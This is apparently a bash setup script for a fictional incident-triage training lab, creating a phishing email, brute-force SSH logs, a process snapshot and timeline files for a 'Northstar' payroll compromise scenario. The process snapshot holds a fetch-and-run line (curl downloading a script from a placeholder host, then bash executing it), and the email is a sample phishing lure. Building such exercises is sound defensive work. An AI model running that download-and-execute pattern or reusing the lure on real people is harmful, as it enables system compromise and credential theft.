#!/bin/bash
set -e

LAB="$HOME/cyber-lab2/northstar-incident"

rm -rf "$HOME/cyber-lab2"
mkdir -p "$LAB"/{evidence,host,logs,messages,reference,timeline}

cat > "$LAB/README.txt" <<'EOF'
NORTHSTAR SERVICES - INCIDENT TRIAGE

Scope: inspect the supplied message, authentication logs, process snapshot and timeline records.
Do not modify the source evidence. Save all analyst-created files in evidence.
All names, addresses, accounts and events are fictional training data.
EOF

cat > "$LAB/reference/incident-brief.txt" <<'EOF'
At 09:30, Northstar's service desk received a report about a suspicious payroll email.
The account r.singh belonged to a former worker and should have been disabled after the person left.
Monitoring also recorded unusual activity on finance workstation ns-fin-07.

Your task is to determine whether the evidence shows:
- an isolated suspicious message;
- unrelated system events; or
- a security incident requiring containment and escalation.
EOF

cat > "$LAB/reference/decision-guide.txt" <<'EOF'
EVENT: an observable occurrence in a system or network.
INDICATOR: an observable sign that may be associated with malicious activity.
ALERT: a notification that asks someone to investigate.
INCIDENT: activity that threatens confidentiality, integrity or availability and requires a response.

One indicator rarely proves an incident. Correlate the message, authentication and host evidence.
EOF

cat > "$LAB/messages/payroll-update.eml" <<'EOF'
From: Northstar IT Support <support@northstar-help.example.invalid>
Reply-To: reset@northstar-secure.example.invalid
To: r.singh@northstar.example.invalid
Date: 2026-09-10T09:12:04Z
Subject: URGENT - payroll access suspended

Your payroll access will be deleted today.
Verify your password immediately at http://northstar-login.example.invalid/reset
Then run the attached payroll update to restore access.

Attachment: payroll_update.sh
EOF

cat > "$LAB/logs/auth.log" <<'EOF'
2026-09-10T09:15:02Z ns-gateway sshd[3110]: Failed password for r.singh from 198.51.100.24 port 51820 ssh2
2026-09-10T09:15:18Z ns-gateway sshd[3112]: Failed password for r.singh from 198.51.100.24 port 51824 ssh2
2026-09-10T09:16:09Z ns-gateway sshd[3118]: Failed password for r.singh from 198.51.100.24 port 51831 ssh2
2026-09-10T09:17:41Z ns-gateway sshd[3127]: Failed password for r.singh from 198.51.100.24 port 51847 ssh2
2026-09-10T09:18:55Z ns-gateway sshd[3134]: Failed password for r.singh from 198.51.100.24 port 51866 ssh2
2026-09-10T09:19:17Z ns-gateway sshd[3139]: Accepted password for r.singh from 198.51.100.24 port 51870 ssh2
2026-09-10T09:20:03Z ns-gateway sshd[3141]: session opened for user r.singh
2026-09-10T09:25:44Z ns-gateway sshd[3155]: Accepted publickey for backup-service from 192.0.2.18 port 44211 ssh2
EOF

cat > "$LAB/host/process-snapshot.txt" <<'EOF'
PID  USER       START     COMMAND
911  root       08:00     /usr/sbin/cron -f
1440 portal     08:03     /usr/bin/python3 /opt/northstar/portal.py
2048 r.singh    09:21     /bin/bash /tmp/payroll_update.sh
2051 r.singh    09:22     curl -fsS http://northstar-tools.example.invalid/update-check.sh -o /tmp/update-check.sh
2052 r.singh    09:22     /bin/bash /tmp/update-check.sh
2104 analyst    09:30     /usr/bin/ps aux
EOF

cat > "$LAB/timeline/email.log" <<'EOF'
2026-09-10T09:12:04Z EMAIL suspicious payroll message delivered to r.singh
EOF

cat > "$LAB/timeline/auth.log" <<'EOF'
2026-09-10T09:15:02Z AUTH first failed password for r.singh from 198.51.100.24
2026-09-10T09:19:17Z AUTH password accepted for r.singh from 198.51.100.24
2026-09-10T09:20:03Z AUTH session opened for r.singh
EOF

cat > "$LAB/timeline/host.log" <<'EOF'
2026-09-10T09:21:00Z HOST payroll_update.sh executed on ns-fin-07
2026-09-10T09:22:00Z HOST update-check.sh downloaded on ns-fin-07
2026-09-10T09:22:02Z HOST update-check.sh executed on ns-fin-07
EOF

(
  cd "$LAB"
  sha256sum README.txt reference/incident-brief.txt reference/decision-guide.txt \
    messages/payroll-update.eml logs/auth.log host/process-snapshot.txt \
    timeline/email.log timeline/auth.log timeline/host.log > reference/source-files.sha256
)

chmod -R u+rwX "$HOME/cyber-lab2"
